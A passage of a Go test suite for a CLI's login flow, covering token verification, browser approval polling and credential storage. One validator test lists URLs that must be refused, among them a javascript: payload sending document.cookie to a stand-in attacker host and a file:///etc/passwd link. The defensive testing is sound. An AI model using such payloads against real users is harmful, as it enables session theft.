package cli

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/krowkcom/cli/internal/api"
	"github.com/krowkcom/cli/internal/output"
	"github.com/krowkcom/cli/internal/runctx"
)

// loginHarness is the harness without a key in the environment, and the path
// login will write to. KROWK_TOKEN would otherwise outrank everything stored,
// which is the one thing these tests are trying to observe. The config
// directory is already a scratch one — newHarness gives every test its own.
func loginHarness(t *testing.T) (*harness, string) {
	t.Helper()
	return newHarness(t, 0).anonymous(), api.CredentialsPath()
}

// storedFile is the whole credentials file, for the few assertions that are
// about the store rather than about one key inside it.
func storedFile(t *testing.T, path string) map[string]any {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("no credentials at %s: %v", path, err)
	}
	var c map[string]any
	if err := json.Unmarshal(data, &c); err != nil {
		t.Fatalf("credentials are not JSON: %v\n%s", err, data)
	}
	return c
}

// stored reads the credentials file the way the next command would: the store
// holds a key per workspace and a pointer at the one to use when nothing names
// one, so what a login left for the next command is that entry, not the file
// around it.
//
// The one-key shape that predates the store reads as its own single entry, which
// is what the credentials reader itself does with it. A login that refuses to
// write leaves the file in whatever shape it was already in, so a test asserting
// on the surviving key has to be able to see it either way.
func stored(t *testing.T, path string) map[string]any {
	t.Helper()
	c := storedFile(t, path)
	if _, current := c["workspaces"]; !current {
		return c
	}
	name, _ := c["default"].(string)
	if name == "" {
		t.Fatalf("the credentials point their default at nothing: %v", c)
	}
	workspaces, _ := c["workspaces"].(map[string]any)
	entry, ok := workspaces[name].(map[string]any)
	if !ok {
		t.Fatalf("the default names %q, which holds no key: %v", name, c)
	}
	return entry
}

// Login asks the registry who the key is before writing it down, and keeps the
// answer. The round trip is what makes every later command able to say where an
// upload lands without making one of its own.
func TestAuthLoginVerifiesTheKeyAndRecordsWhatCameBack(t *testing.T) {
	h, path := loginHarness(t)

	code, stdout, stderr := h.run("auth", "login", "--token", "krowk_sk_pasted")
	if code != 0 {
		t.Fatalf("exit %d, stderr: %s", code, stderr)
	}

	c := stored(t, path)
	if c["token"] != "krowk_sk_pasted" {
		t.Errorf("token = %v, want the pasted key", c["token"])
	}
	if c["key_id"] == nil || c["key_id"] == "" {
		t.Errorf("credentials name no key: %v", c)
	}
	workspace, _ := c["workspace"].(string)
	if !strings.HasPrefix(workspace, "ws_") {
		t.Errorf("workspace = %v, want the one the registry named", c["workspace"])
	}
	// Someone logging in is about to push. Saying where that lands is the
	// difference between a confirmation and a receipt.
	if !strings.Contains(stdout, workspace) {
		t.Errorf("login output does not say where uploads land:\n%s", stdout)
	}
}

// A key the registry disowns is not worth keeping, and writing it over a
// working one would leave the machine worse off than never having logged in.
func TestAuthLoginRefusesAKeyTheRegistryRejects(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprint(w, `{"error":{"code":"unauthorized","message":"Provide a valid API key."}}`)
	}))
	t.Cleanup(srv.Close)

	h, path := loginHarness(t)
	if _, err := api.SaveCredentials("krowk_sk_working", api.Identity{
		KeyID: "key_good", Workspace: "ws_acme",
	}); err != nil {
		t.Fatal(err)
	}
	seeded, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	h.env["KROWK_API_URL"] = srv.URL + "/v1"

	body := h.fails("auth", "login", "--token", "krowk_sk_typo")
	if body["error"] != "unauthorized" {
		t.Errorf("error = %v, want unauthorized", body["error"])
	}
	// The standing advice for a rejected key is to log in — which is the command
	// that just failed. Telling someone to retry what they are doing is not a fix.
	if fix, _ := body["fix"].(string); strings.Contains(fix, "auth login") {
		t.Errorf("fix = %q, which is the command that just failed", fix)
	}

	// The working key is still the one the next command would reach for, and its
	// workspace still says what the registry said about it.
	c := stored(t, path)
	if c["token"] != "krowk_sk_working" || c["key_id"] != "key_good" {
		t.Errorf("a rejected login overwrote the working key: %v", c)
	}
	// And it is still there because nothing was written at all, rather than
	// because a rewrite happened to keep it: a store with more than one key in it
	// has more to lose than the entry being replaced.
	after, err := os.ReadFile(path)
	if err != nil || !bytes.Equal(after, seeded) {
		t.Errorf("a rejected login rewrote the credentials file:\n%s", after)
	}
}

// An unreachable registry says nothing about the key. Logging in on a plane and
// pushing after landing is a real thing to do, so the token is stored anyway —
// with the confirmation withheld rather than faked.
func TestAuthLoginStoresAnUnconfirmedKeyWhenTheRegistryIsSilent(t *testing.T) {
	h, path := loginHarness(t)
	// A port nothing is listening on: the request fails before any status.
	h.env["KROWK_API_URL"] = "http://127.0.0.1:1/v1"

	code, stdout, stderr := h.run("auth", "login", "--token", "krowk_sk_offline")
	if code != 0 {
		t.Fatalf("exit %d, stderr: %s — an unreachable registry is not a bad key", code, stderr)
	}
	if !strings.Contains(stdout, "unconfirmed") {
		t.Errorf("output claims more than it knows:\n%s", stdout)
	}

	c := stored(t, path)
	if c["token"] != "krowk_sk_offline" {
		t.Errorf("token = %v, want it stored despite the silence", c["token"])
	}
	// Nothing was confirmed, so nothing is recorded. An identity here would be
	// invented.
	if _, named := c["key_id"]; named {
		t.Errorf("credentials name a key the registry never confirmed: %v", c)
	}
	// A key with no workspace has to be filed somewhere, and it files under
	// "default" — a real entry name, so an offline login is storable and
	// replaceable like any other. The entry's own workspace field stays empty,
	// because that emptiness is the honest record of what the registry said.
	if ws, recorded := c["workspace"]; recorded && ws != "" {
		t.Errorf("workspace = %v, want none — the registry named none", ws)
	}
	if file := storedFile(t, path); file["default"] != "default" {
		t.Errorf("default = %v, want the unconfirmed key filed under \"default\": %v",
			file["default"], file)
	}
}

// A registry that answers with something other than a key is a misconfigured
// URL, not a bad key — same treatment as silence.
func TestAuthLoginStoresWhenTheAnswerIsNotARegistrys(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"welcome":"to the website"}`)
	}))
	t.Cleanup(srv.Close)

	h, path := loginHarness(t)
	h.env["KROWK_API_URL"] = srv.URL + "/v1"

	code, stdout, stderr := h.run("auth", "login", "--token", "krowk_sk_maybe")
	if code != 0 {
		t.Fatalf("exit %d, stderr: %s", code, stderr)
	}
	if !strings.Contains(stdout, "unconfirmed") {
		t.Errorf("output claims more than it knows:\n%s", stdout)
	}
	if c := stored(t, path); c["token"] != "krowk_sk_maybe" {
		t.Errorf("token = %v, want it stored", c["token"])
	}
}

// Output is JSON when piped, which is how an agent reads a command it did not
// run interactively. Login had been printing prose regardless, so the one thing
// an agent needs from it — whether the key was actually confirmed — was only
// available as a sentence.
func TestAuthLoginIsMachineReadableWhenAskedFor(t *testing.T) {
	h, path := loginHarness(t)

	e := loginEnvelope(t, h, "auth", "login", "--token", "krowk_sk_pasted", "--json")
	if !e.OK {
		t.Fatalf("login = %+v", e)
	}
	got := e.Data
	if !got.Confirmed {
		t.Errorf("confirmed = false against a reachable registry: %+v", got)
	}
	if got.KeyID == "" || !strings.HasPrefix(got.Workspace, "ws_") {
		t.Errorf("login named no key or workspace: %+v", got)
	}
	if got.Path != path {
		t.Errorf("path = %q, want %q", got.Path, path)
	}
	if got.Reason != "" {
		t.Errorf("reason = %q, want none — the registry confirmed it", got.Reason)
	}
}

// The unconfirmed case is the one that has to be machine-readable: the command
// succeeded, the token is stored, and whether it works is still unknown.
func TestAuthLoginReportsBeingUnconfirmedInJSON(t *testing.T) {
	h, _ := loginHarness(t)
	h.env["KROWK_API_URL"] = "http://127.0.0.1:1/v1"

	e := loginEnvelope(t, h, "auth", "login", "--token", "krowk_sk_offline", "--json")
	got := e.Data
	if got.Confirmed {
		t.Errorf("confirmed = true with nothing listening: %+v", got)
	}
	if got.Reason == "" {
		t.Errorf("nothing says why it is unconfirmed: %+v", got)
	}
	// Inventing a key here would be the whole bug this field exists to avoid.
	if got.KeyID != "" {
		t.Errorf("key_id = %q, want none — the registry never named one", got.KeyID)
	}
	if !strings.Contains(e.Summary, "unconfirmed") {
		t.Errorf("summary = %q, want it to say so", e.Summary)
	}
}

// pollClock is a clock the poll loop moves itself: it advances when the loop
// sleeps and not when it reads the time. Reading the time must not make it pass,
// or a test's arithmetic depends on how many times the code under test happens to
// look at its watch.
type pollClock struct{ at time.Time }

func (c *pollClock) now() time.Time        { return c.at }
func (c *pollClock) sleep(d time.Duration) { c.at = c.at.Add(d) }

// windowOf is the authorization window a poll loop runs inside. It is the
// context's deadline and nowhere else, so a test says how long the login has by
// building the context the real caller builds.
func windowOf(t *testing.T, closes time.Time) context.Context {
	t.Helper()
	ctx, stop := context.WithDeadline(context.Background(), closes)
	t.Cleanup(stop)
	return ctx
}

// codeShown is the code `auth login` prints for a person to compare against the
// page. Scraped from stderr because that is where it goes — stdout stays the one
// document a program parses — and because it is how these tests press Approve
// knowing nothing the command did not say out loud.
var codeShown = regexp.MustCompile(`[2-9A-HJ-NP-Z]{4}-[2-9A-HJ-NP-Z]{4}`)

// notice is stderr with a tap on it. `auth login` prints the code before it
// begins polling, so the write carrying that code is the moment there is
// something to approve.
type notice struct {
	mu   sync.Mutex
	buf  strings.Builder
	code chan string
	sent bool
}

func newNotice() *notice { return &notice{code: make(chan string, 1)} }

func (n *notice) Write(p []byte) (int, error) {
	n.mu.Lock()
	defer n.mu.Unlock()
	written, err := n.buf.Write(p)
	if !n.sent {
		if code := codeShown.FindString(n.buf.String()); code != "" {
			n.sent = true
			n.code <- code
		}
	}
	return written, err
}

func (n *notice) String() string {
	n.mu.Lock()
	defer n.mu.Unlock()
	return n.buf.String()
}

// browserLogin runs `krowk auth login` the way a person does. The command blocks
// until somebody answers, so the answer has to arrive from elsewhere while it
// waits: this presses one of the stand-in's two buttons as soon as the command
// says which code it is waiting on.
func browserLogin(t *testing.T, h *harness, button string, args ...string) (exit int, stdout, stderr string) {
	t.Helper()

	shown := newNotice()
	var out bytes.Buffer
	done := make(chan int, 1)
	go func() {
		// --no-browser always: a test must never reach for the desktop's URL
		// handler, and on macOS and Windows nothing else here would stop it.
		done <- Run(append([]string{"auth", "login", "--no-browser"}, args...), &out, shown,
			func(k string) string { return h.env[k] }, false)
	}()

	// Generous, because it bounds a test that hangs rather than the flow itself:
	// the stand-in asks to be polled once a second, so the real wait is that.
	const patience = 30 * time.Second
	select {
	case waiting := <-shown.code:
		press(t, h, waiting, button)
	case <-time.After(patience):
		t.Fatalf("`auth login` never said which code it was waiting on:\n%s", shown)
	}
	select {
	case code := <-done:
		return code, out.String(), shown.String()
	case <-time.After(patience):
		t.Fatalf("`auth login` never finished after being answered:\n%s", shown)
		return 0, "", ""
	}
}

// press is the person at the browser: the stand-in serves an approval page with
// two buttons, and this posts what one of them would.
func press(t *testing.T, h *harness, code, button string) {
	t.Helper()
	res, err := http.Post(h.server.URL+"/_approve/cli/authorizations/"+
		url.PathEscape(code)+"/"+button, "", nil)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	if res.StatusCode != http.StatusOK {
		t.Fatalf("pressing %s on %s answered %d", button, code, res.StatusCode)
	}
}

// The default login is the browser one, and it is the whole point of the flow: no
// key is pasted, because the key does not exist until somebody approves the
// request. What comes back is stored exactly where --token would have put it.
func TestAuthLoginInTheBrowserStoresTheKeyTheApprovalMinted(t *testing.T) {
	h, path := loginHarness(t)

	exit, stdout, stderr := browserLogin(t, h, "approval")
	if exit != 0 {
		t.Fatalf("exit %d, stderr:\n%s", exit, stderr)
	}

	c := stored(t, path)
	if token, _ := c["token"].(string); !strings.HasPrefix(token, "krowk_sk_") {
		t.Errorf("token = %v, want the key the approval minted", c["token"])
	}
	if c["key_id"] == nil || c["key_id"] == "" {
		t.Errorf("credentials name no key: %v", c)
	}
	workspace, _ := c["workspace"].(string)
	if !strings.HasPrefix(workspace, "ws_") {
		t.Errorf("workspace = %v, want the one the approval named", c["workspace"])
	}
	// Someone logging in is about to push, so where that lands is the receipt.
	if !strings.Contains(stdout, workspace) {
		t.Errorf("login output does not say where uploads land:\n%s", stdout)
	}
	// The harness is not a terminal, so this is the machine notice; the prose one
	// is TestAuthLoginInTheBrowserTellsAPersonWhatToDo below.
	if !codeShown.MatchString(stderr) {
		t.Errorf("nothing told the caller what it was waiting on:\n%s", stderr)
	}
	// Nothing in the environment outranks what was just written, so the receipt is
	// about the key that will really be used.
	if strings.Contains(stdout, "KROWK_TOKEN") {
		t.Errorf("the receipt hedges about a variable that is not set:\n%s", stdout)
	}
}

// KROWK_TOKEN wins over the credentials file, so a login that writes one while it
// is set has just stored a key nothing will use. The receipt is a receipt for
// where uploads land, and it may not name a workspace they will not land in.
func TestAuthLoginSaysWhenTheEnvironmentOutranksWhatItStored(t *testing.T) {
	h, path := loginHarness(t)
	h.env["KROWK_TOKEN"] = "krowk_sk_from_ci"

	exit, stdout, stderr := browserLogin(t, h, "approval")
	if exit != 0 {
		t.Fatalf("exit %d, stderr:\n%s", exit, stderr)
	}
	// It still stores it — unsetting the variable is the caller's to do, and a
	// login that refused to write would leave nothing behind when they did.
	if c := stored(t, path); c["key_id"] == nil {
		t.Errorf("nothing was stored: %v", c)
	}
	if !strings.Contains(stdout, "KROWK_TOKEN") {
		t.Errorf("the receipt names a workspace uploads will not land in:\n%s", stdout)
	}
}

// What a person needs while the command waits goes to stderr, so stdout stays the
// single document a program parses. An agent doing this reads one stream to hand
// its human a code and parses the other for the result — and in a machine format
// the notice is a document too, so nothing on either stream is prose it has to
// scrape.
func TestAuthLoginInTheBrowserKeepsStdoutParseable(t *testing.T) {
	h, _ := loginHarness(t)

	exit, stdout, stderr := browserLogin(t, h, "approval", "--json")
	if exit != 0 {
		t.Fatalf("exit %d, stderr:\n%s", exit, stderr)
	}

	var e struct {
		OK   bool         `json:"ok"`
		Data output.Login `json:"data"`
	}
	if err := json.Unmarshal([]byte(stdout), &e); err != nil {
		t.Fatalf("stdout is not one JSON document: %v\n%s", err, stdout)
	}
	if !e.OK || !e.Data.Confirmed {
		t.Errorf("login = %+v, want a confirmed one — the registry minted this key itself", e)
	}
	if e.Data.KeyID == "" || !strings.HasPrefix(e.Data.Workspace, "ws_") {
		t.Errorf("login named no key or workspace: %+v", e.Data)
	}

	var notice struct {
		Authorizing *output.Authorization `json:"authorizing"`
		// An envelope's verdict, which this must not carry: an agent reading ok:true
		// off a login that has not happened yet would take it for one that has.
		OK *bool `json:"ok"`
	}
	if err := json.Unmarshal([]byte(stderr), &notice); err != nil {
		t.Fatalf("the notice on stderr is not one JSON document: %v\n%s", err, stderr)
	}
	if notice.Authorizing == nil {
		t.Fatalf("stderr named no authorization to approve:\n%s", stderr)
	}
	if notice.OK != nil {
		t.Errorf("the notice carries a verdict on a login that has not happened:\n%s", stderr)
	}
	if !codeShown.MatchString(notice.Authorizing.Code) {
		t.Errorf("code = %q, want the one to confirm", notice.Authorizing.Code)
	}
	if !strings.Contains(notice.Authorizing.Page, "/_approve/cli/authorizations/new") {
		t.Errorf("page = %q, want the one to approve it on", notice.Authorizing.Page)
	}
	if notice.Authorizing.Opened {
		t.Error("opened = true with --no-browser")
	}
}

// On a terminal the notice is prose, because the reader is a person comparing a
// code against a page rather than a program branching on anything.
func TestAuthLoginInTheBrowserTellsAPersonWhatToDo(t *testing.T) {
	h, _ := loginHarness(t)

	exit, _, stderr := browserLogin(t, h, "approval", "--format", "human")
	if exit != 0 {
		t.Fatalf("exit %d, stderr:\n%s", exit, stderr)
	}
	for _, want := range []string{"Open this page", "waiting for approval", "code", "page"} {
		if !strings.Contains(stderr, want) {
			t.Errorf("the notice is missing %q:\n%s", want, stderr)
		}
	}
	// --no-browser was passed, so nothing may claim a browser is opening.
	if strings.Contains(stderr, "browser is opening") {
		t.Errorf("--no-browser still claimed to open one:\n%s", stderr)
	}
}

// A login that fails has something on stderr ahead of the error, because the
// command had to speak before it knew its outcome. So the rule for that stream is
// that the *last* document is the verdict, and it has to be a whole envelope
// rather than prose the error is stuck to.
func TestAuthLoginInTheBrowserLeavesTheErrorLastOnStderr(t *testing.T) {
	h, _ := loginHarness(t)

	exit, _, stderr := browserLogin(t, h, "denial", "--json")
	if exit == 0 {
		t.Fatal("a denied login succeeded")
	}

	documents := json.NewDecoder(strings.NewReader(stderr))
	var last map[string]any
	for {
		var doc map[string]any
		if err := documents.Decode(&doc); err != nil {
			break
		}
		last = doc
	}
	if last == nil {
		t.Fatalf("stderr holds no JSON document at all:\n%s", stderr)
	}
	if last["ok"] != false {
		t.Fatalf("the last document on stderr is not the verdict:\n%s", stderr)
	}
	failure, _ := last["error"].(map[string]any)
	if failure["error"] != "authorization_denied" {
		t.Errorf("error = %v, want authorization_denied", failure["error"])
	}
}

// Somebody saying no is an answer. It must not be reported as success, and it
// must not disturb the key already on the machine.
func TestAuthLoginInTheBrowserLeavesAWorkingKeyAloneWhenDenied(t *testing.T) {
	h, path := loginHarness(t)
	if _, err := api.SaveCredentials("krowk_sk_working", api.Identity{
		KeyID: "key_good", Workspace: "ws_acme",
	}); err != nil {
		t.Fatal(err)
	}
	seeded, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}

	exit, stdout, stderr := browserLogin(t, h, "denial")
	if exit == 0 {
		t.Fatalf("a denied login succeeded, stdout:\n%s", stdout)
	}
	if !strings.Contains(stderr, "authorization_denied") {
		t.Errorf("the failure does not say it was denied:\n%s", stderr)
	}
	if c := stored(t, path); c["token"] != "krowk_sk_working" || c["key_id"] != "key_good" {
		t.Errorf("a denied login overwrote the working key: %v", c)
	}
	// Denied means nothing was written, not that the store was rewritten around
	// the key that survived.
	after, err := os.ReadFile(path)
	if err != nil || !bytes.Equal(after, seeded) {
		t.Errorf("a denied login rewrote the credentials file:\n%s", after)
	}
}

// --no-browser beside --token is not a contradiction and not an error: it asks
// for no browser, and storing a key opens none. A CI script passing both
// defensively is saying something true.
func TestAuthLoginTakesNoBrowserBesideAToken(t *testing.T) {
	h, path := loginHarness(t)

	code, _, stderr := h.run("auth", "login", "--token", "krowk_sk_pasted", "--no-browser")
	if code != 0 {
		t.Fatalf("exit %d, stderr: %s", code, stderr)
	}
	if stderr != "" {
		t.Errorf("storing a key printed progress meant for a browser login: %s", stderr)
	}
	if c := stored(t, path); c["token"] != "krowk_sk_pasted" {
		t.Errorf("token = %v, want the pasted key", c["token"])
	}
}

// A key typed without its flag is the mistake this command will see most, and
// nothing reads a positional here — so it would be dropped on the floor and the
// command would go and wait a quarter of an hour for a login nobody wanted.
func TestAuthLoginRefusesAKeyPassedWithoutItsFlag(t *testing.T) {
	h, _ := loginHarness(t)

	code, stdout, stderr := h.run("auth", "login", "krowk_sk_pasted_without_the_flag", "--json")
	if code == 0 {
		t.Fatalf("a stray key was accepted, stdout:\n%s", stdout)
	}
	body := decode(t, stderr).Error
	if body["error"] != "token_not_a_positional" {
		t.Errorf("error = %v, want token_not_a_positional", body["error"])
	}
	fix, _ := body["fix"].(string)
	if !strings.Contains(fix, "--token") {
		t.Errorf("fix = %q, which does not say where the key goes", fix)
	}
	// The key is already in a shell history; it does not also belong in whatever
	// captured this command's stderr.
	if strings.Contains(stderr, "krowk_sk_pasted_without_the_flag") {
		t.Errorf("the failure quoted the key back:\n%s", stderr)
	}
	// And nothing was opened or polled: the whole point is that it fails at once.
	if strings.Contains(stderr, "authorizing") {
		t.Errorf("a browser login was started anyway:\n%s", stderr)
	}
}

// Any other stray argument is a mistyped command line, and it says so with the
// argument quoted — there is nothing secret about a word that is not a key.
func TestAuthLoginRefusesAnyOtherStrayArgument(t *testing.T) {
	h, _ := loginHarness(t)

	body := h.fails("auth", "login", "please")
	if body["error"] != "unexpected_argument" {
		t.Errorf("error = %v, want unexpected_argument", body["error"])
	}
	if fix, _ := body["fix"].(string); !strings.Contains(fix, "please") {
		t.Errorf("fix = %q, which does not name what it objected to", fix)
	}
}

// Nothing on CI can approve a browser login: no person, no browser. Waiting out
// the window to then report that nobody approved it wastes fifteen minutes of a
// build to say something knowable at once.
func TestAuthLoginRefusesABrowserLoginOnCI(t *testing.T) {
	for _, marker := range []string{"CI", "GITHUB_ACTIONS"} {
		h, _ := loginHarness(t)
		h.env[marker] = "true"

		body := h.failsWith(exitAuth, "auth", "login")
		if body["error"] != "no_one_to_approve" {
			t.Errorf("with %s set, error = %v, want no_one_to_approve", marker, body["error"])
		}
		if fix, _ := body["fix"].(string); !strings.Contains(fix, "--token") {
			t.Errorf("fix = %q, which does not name the way in that works on CI", fix)
		}
	}
}

// --token is how CI logs in, so that path must not be caught by the refusal above.
func TestAuthLoginWithATokenStillWorksOnCI(t *testing.T) {
	h, path := loginHarness(t)
	h.env["CI"] = "true"

	if code, _, stderr := h.run("auth", "login", "--token", "krowk_sk_pasted"); code != 0 {
		t.Fatalf("exit %d on CI with a key, stderr: %s", code, stderr)
	}
	if c := stored(t, path); c["token"] != "krowk_sk_pasted" {
		t.Errorf("token = %v, want the pasted key", c["token"])
	}
}

// An approval that hands over a key but does not say which key, or where it acts,
// has still handed over a key — and the plaintext is gone from the registry the
// moment that read returns. Throwing it away over a receipt that would read blank
// would leave a minted key nobody can ever collect.
func TestAuthLoginStoresAKeyTheApprovalDidNotDescribe(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch r.URL.Path {
		case "/v1/cli/authorizations":
			w.WriteHeader(http.StatusCreated)
			fmt.Fprintf(w, `{"slug":"aut_x","state":"pending","code":"AAAA-BBBB",`+
				`"verification_url":%q,"interval":1}`, srvPage)
		default:
			fmt.Fprint(w, `{"slug":"aut_x","state":"approved","token":"krowk_sk_undescribed"}`)
		}
	}))
	t.Cleanup(srv.Close)

	h, path := loginHarness(t)
	h.env["KROWK_API_URL"] = srv.URL + "/v1"

	code, stdout, stderr := h.run("auth", "login", "--no-browser", "--json")
	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr)
	}
	if c := stored(t, path); c["token"] != "krowk_sk_undescribed" {
		t.Errorf("token = %v, want the key stored anyway", c["token"])
	}
	// Stored, and not claimed to be more than it is: the identity is what could not
	// be confirmed, exactly as on the --token path against a silent registry.
	var e struct {
		OK   bool         `json:"ok"`
		Data output.Login `json:"data"`
	}
	if err := json.Unmarshal([]byte(stdout), &e); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, stdout)
	}
	if !e.OK {
		t.Errorf("login = %+v, want ok — the key is on disk and works", e)
	}
	if e.Data.Confirmed {
		t.Errorf("confirmed = true for a key the registry never described: %+v", e.Data)
	}
	if e.Data.Reason == "" {
		t.Errorf("nothing says why it is unconfirmed: %+v", e.Data)
	}
	if !strings.Contains(stdout, "auth verify") {
		t.Errorf("nothing points at the command that settles it:\n%s", stdout)
	}
}

// srvPage is an http page on a host nothing serves. browsableURL only judges the
// scheme, and these tests never open anything, so it just has to be a URL.
const srvPage = "http://127.0.0.1:9/cli/authorizations/new?code=AAAA-BBBB"

// A registry with no browser login endpoint is the likeliest 404 here — the two
// halves of this flow ship from two repositories, and a self-hosted registry may
// never grow the second. Telling someone to check a base URL that is exactly
// right sends them to confirm the one part that was not wrong.
func TestAuthLoginSaysSoWhenTheRegistryHasNoBrowserLogin(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"error":{"code":"no_such_endpoint","message":"No such endpoint."}}`)
	}))
	t.Cleanup(srv.Close)

	h, _ := loginHarness(t)
	h.env["KROWK_API_URL"] = srv.URL + "/v1"

	exit, stdout, stderr := h.run("auth", "login")
	if exit == 0 {
		t.Fatalf("a login against a registry that cannot serve one succeeded:\n%s", stdout)
	}
	if !strings.Contains(stderr, "--token") {
		t.Errorf("nothing names the way in that still works:\n%s", stderr)
	}
	if _, err := os.Stat(api.CredentialsPath()); err == nil {
		t.Error("a login that never got a key wrote credentials anyway")
	}
}

// The page the registry names is handed to the desktop's URL handler, which is a
// far broader thing than an HTTP client: `file://` walks the disk, `javascript:`
// runs inside whatever is already open, and desktops register schemes that start
// programs. So the scheme is the check, and http is only allowed where the caller
// already chose an http registry.
func TestBrowserLoginOnlyOpensTheWeb(t *testing.T) {
	for _, raw := range []string{
		"file:///etc/passwd",
		"javascript:fetch('http://evil.example/?c='+document.cookie)",
		"vscode://ms-vscode.remote-explorer/x",
		"",
		"http://app.krowk.com/cli/authorizations/new?code=AAAA-BBBB",
	} {
		if got, err := browsableURL(raw, api.New("https://api.krowk.com/v1", "")); err == nil {
			t.Errorf("browsableURL(%q) would open %q", raw, got)
		}
	}

	// A registry reached over plain http is the caller's own choice — a local one,
	// or a self-hosted one inside a private network — and its login page is on the
	// same footing.
	local := "http://127.0.0.1:8787/_approve/cli/authorizations/new?code=AAAA-BBBB"
	if got, err := browsableURL(local, api.New("http://localhost:8787/v1", "")); err != nil || got != local {
		t.Errorf("browsableURL(local) = %q, %v — a local registry's own page was refused", got, err)
	}
	page := "https://app.krowk.com/cli/authorizations/new?code=AAAA-BBBB"
	if got, err := browsableURL(page, api.New("https://api.krowk.com/v1", "")); err != nil || got != page {
		t.Errorf("browsableURL(%q) = %q, %v", page, got, err)
	}
}

// Over SSH the browser is at the other end of the connection, and a container has
// no display at all. Both print instead of opening, which is the case this whole
// flow exists for.
func TestHeadlessFindsWhereThereIsNoBrowserToOpen(t *testing.T) {
	env := func(pairs map[string]string) runctx.Env {
		return func(k string) string { return pairs[k] }
	}

	// A display of its own does not help: the display is on the machine krowk is
	// running on, and the person is not.
	if !headless(env(map[string]string{
		"SSH_CONNECTION": "10.0.0.1 55232 10.0.0.2 22", "DISPLAY": ":0",
	})) {
		t.Error("a session reached over SSH would open a browser on the wrong machine")
	}

	switch runtime.GOOS {
	case "darwin", "windows":
		if headless(env(nil)) {
			t.Error("a desktop platform was called headless for having no unix display variables")
		}
	default:
		if !headless(env(nil)) {
			t.Error("a container with no display server would try to open a browser")
		}
		if headless(env(map[string]string{"WAYLAND_DISPLAY": "wayland-0"})) {
			t.Error("a wayland session was called headless")
		}
		if headless(env(map[string]string{"DISPLAY": ":0"})) {
			t.Error("an X session was called headless")
		}
	}
}

// A poll that fails is not a login that failed. A 502 or a rate limit says nothing
// about whether somebody approved it, so the window is kept rather than an
// approval that may already have happened being thrown away.
func TestAwaitingApprovalWaitsThroughFailuresThatAreNotAnswers(t *testing.T) {
	var polls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		// Enough refusals to exhaust the retries inside one call, so the loop out
		// here is what has to decide to ask again.
		if polls.Add(1) <= 3 {
			w.WriteHeader(http.StatusServiceUnavailable)
			fmt.Fprint(w, `{"error":{"code":"internal_server_error","message":"not now"}}`)
			return
		}
		fmt.Fprint(w, `{"slug":"aut_x","state":"approved","token":"krowk_sk_new",`+
			`"key_id":"key_1","workspace":"ws_1"}`)
	}))
	t.Cleanup(srv.Close)

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}
	waits := 0

	granted, err := awaitAuthorization(windowOf(t, time.Now().Add(time.Hour)), client,
		&api.CLIAuthorization{Slug: "aut_x"}, time.Now, func(time.Duration) { waits++ })
	if err != nil {
		t.Fatalf("a login that was approved after a bad patch failed: %v", err)
	}
	if granted.Token != "krowk_sk_new" {
		t.Errorf("token = %q", granted.Token)
	}
	// Two: once before the first read, since a login milliseconds old cannot have
	// been approved, and once after the round of refusals.
	if waits != 2 {
		t.Errorf("waited %d times, want twice — before the first read, then after the refusals", waits)
	}
}

// A 410 is an answer: the login is gone, and asking again cannot change it. The
// advice has to be about a login, too — the registry spells a lapsed record
// `expired` whatever the record is, and its artifact wording is nonsense here.
func TestAwaitingApprovalStopsWhenTheLoginIsGone(t *testing.T) {
	var polls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		polls.Add(1)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusGone)
		fmt.Fprint(w, `{"error":{"code":"expired","message":"This authorization has expired."}}`)
	}))
	t.Cleanup(srv.Close)

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

	_, err := awaitAuthorization(windowOf(t, time.Now().Add(time.Hour)), client,
		&api.CLIAuthorization{Slug: "aut_x"}, time.Now, func(time.Duration) {})
	var apiErr *api.Error
	if !errors.As(err, &apiErr) || apiErr.Status != http.StatusGone {
		t.Fatalf("err = %v, want a 410", err)
	}
	if got := polls.Load(); got != 1 {
		t.Errorf("polled %d times, want once", got)
	}
	if fix := apiErr.Fix(); !strings.Contains(fix, "auth login") || strings.Contains(fix, "upload") {
		t.Errorf("fix = %q, which is advice about an artifact rather than about a login", apiErr.Fix())
	}
	if exitCodeFor(err) != exitGone {
		t.Errorf("exit = %d, want %d", exitCodeFor(err), exitGone)
	}
}

// The window is bounded, so a login nobody ever answers does not leave a
// forgotten terminal polling for the rest of the afternoon. krowk concluding it
// locally reports the same code the registry's own 410 would.
func TestAwaitingApprovalGivesUpWhenTheWindowCloses(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"slug":"aut_x","state":"pending"}`)
	}))
	t.Cleanup(srv.Close)

	clock := &pollClock{at: time.Now()}

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

